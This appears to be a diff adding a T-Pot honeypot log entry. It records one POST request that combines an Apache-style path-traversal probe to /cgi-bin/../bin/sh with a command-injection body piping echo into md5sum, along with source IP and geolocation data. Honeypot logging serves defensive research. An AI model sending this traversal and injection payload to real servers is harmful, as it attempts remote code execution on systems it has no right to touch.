@@ -1,0 +1,93 @@
+[
+    {
+		"cookies": {
+			" sidebar_collapsed": "false",
+			"sess_uuid": "bdaf2baf-8025-40c5-8423-fc96675d4e8a",
+			" sess_uuid": "b989a87b-acab-48f0-897d-eb9fd300bd72",
+			" username": "null",
+			"userLanguage": "EN"
+		},
+		"method": "POST",
+		"host": "bd6a79c9e47d",
+		"ip_rep": "bot, crawler",
+		"type": "Tanner",
+		"t-pot_ip_ext": "40.76.178.241",
+		"t-pot_hostname": "tragicsaw",
+		"dest_port": 80,
+		"uuid": "89994ea2-a508-4fd5-abbb-0a09f6fcf74b",
+		"path": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
+		"timestamp": "2023-07-07T08:06:25.289861",
+		"status": 200,
+		"geoip_ext": {
+			"country_name": "United States",
+			"city_name": "Tappahannock",
+			"asn": 8075,
+			"continent_code": "NA",
+			"ip": "40.76.178.241",
+			"timezone": "America/New_York",
+			"latitude": 37.9273,
+			"postal_code": "22560",
+			"country_code2": "US",
+			"longitude": -76.8545,
+			"region_code": "VA",
+			"region_name": "Virginia",
+			"location": {
+				"lon": -76.8545,
+				"lat": 37.9273
+			},
+			"country_code3": "US",
+			"dma_code": 556,
+			"as_org": "MICROSOFT-CORP-MSN-AS-BLOCK"
+		},
+		"peer": {},
+		"t-pot_ip_int": "10.0.2.4",
+		"geoip": {
+			"country_name": "France",
+			"city_name": "Paris",
+			"asn": 208312,
+			"continent_code": "EU",
+			"ip": "213.109.202.66",
+			"timezone": "Europe/Paris",
+			"latitude": 48.8323,
+			"postal_code": "75001",
+			"country_code2": "FR",
+			"longitude": 2.4075,
+			"region_code": "75",
+			"region_name": "Paris",
+			"location": {
+				"lon": 2.4075,
+				"lat": 48.8323
+			},
+			"country_code3": "FR",
+			"as_org": "Red Byte LLC"
+		},
+		"post_data": {
+			"A": "|echo;echo -n PXJISSOChe|md5sum"
+		},
+		"headers": {
+			"connection": "close",
+			"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
+			"content-length": "33",
+			"accept": "*/*",
+			"content-type": "application/x-www-form-urlencoded",
+			"host": "40.76.178.241:80",
+			"accept-encoding": "gzip"
+		},
+		"src_ip": "213.109.202.66",
+		"src_port": 40834,
+		"response_msg": {
+			"version": "0.6.0",
+			"response": {
+				"message": {
+					"sess_uuid": "314ae17e-5f03-4666-88ab-a6edcb5bab48",
+					"detection": {
+						"version": "0.6.0",
+						"type": 1,
+						"order": 0,
+						"name": "unknown"
+					}
+				}
+			}
+		}
+    }
+]
